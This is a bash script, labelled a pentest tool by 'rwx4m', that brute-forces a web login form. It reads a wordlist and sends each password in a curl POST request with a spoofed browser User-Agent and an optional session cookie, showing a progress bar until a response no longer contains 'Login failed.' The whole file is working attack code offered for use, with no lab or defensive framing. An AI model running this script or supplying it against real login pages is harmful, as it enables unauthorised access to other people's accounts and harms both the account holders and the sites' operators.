#!/bin/bash

if command -v figlet >/dev/null 2>&1; then
    figlet "rwx4m"
else
    echo -e "\e[35m=== Pentest Tool by rwx4m ===\e[0m"
fi

echo -e "\e[36mGitHub:\e[0m https://github.com/rwx4m"
echo -e ""

GREEN="\e[32m"
CYAN="\e[36m"
RED="\e[31m"
RESET="\e[0m"

if [ "$#" -lt 3 ]; then
    echo -e "${CYAN}Usage: $0 <url> <username> <wordlist> [cookie]${RESET}"
    exit 1
fi

URL="$1"
USERNAME="$2"
WORDLIST="$3"
COOKIE="$4"

if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[!] Wordlist '$WORDLIST' not found.${RESET}"
    exit 1
fi

TOTAL=$(wc -l < "$WORDLIST")
COUNT=0
BAR_WIDTH=30

echo -e "${CYAN}[*] Starting password brute-force for user '${USERNAME}' (Total: $TOTAL)\n${RESET}"

while read PASS; do
    ((COUNT++))
    PERCENT=$(( COUNT * 100 / TOTAL ))
    FILLED=$(( BAR_WIDTH * COUNT / TOTAL ))
    EMPTY=$(( BAR_WIDTH - FILLED ))
    BAR="$(printf '%0.s█' $(seq 1 $FILLED))"
    SPACES="$(printf '%0.s-' $(seq 1 $EMPTY))"
    echo -ne "Progress: [${BAR}${SPACES}] $PERCENT%% ($COUNT/$TOTAL) - $PASS\r"

    if [ -n "$COOKIE" ]; then
        response=$(curl -s -X POST "$URL" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "User-Agent: Mozilla/5.0" \
            -H "Referer: $URL" \
            -H "Cookie: $COOKIE" \
            --data "username=$USERNAME&password=$PASS")
    else
        response=$(curl -s -X POST "$URL" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "User-Agent: Mozilla/5.0" \
            -H "Referer: $URL" \
            --data "username=$USERNAME&password=$PASS")
    fi

    if ! echo "$response" | grep -q "Login failed."; then
        echo -e "\n\n${GREEN}[+] Password found: $PASS${RESET}"
        exit 0
    fi
done < "$WORDLIST"

echo -e "\n\n${RED}[-] No valid password found.${RESET}"
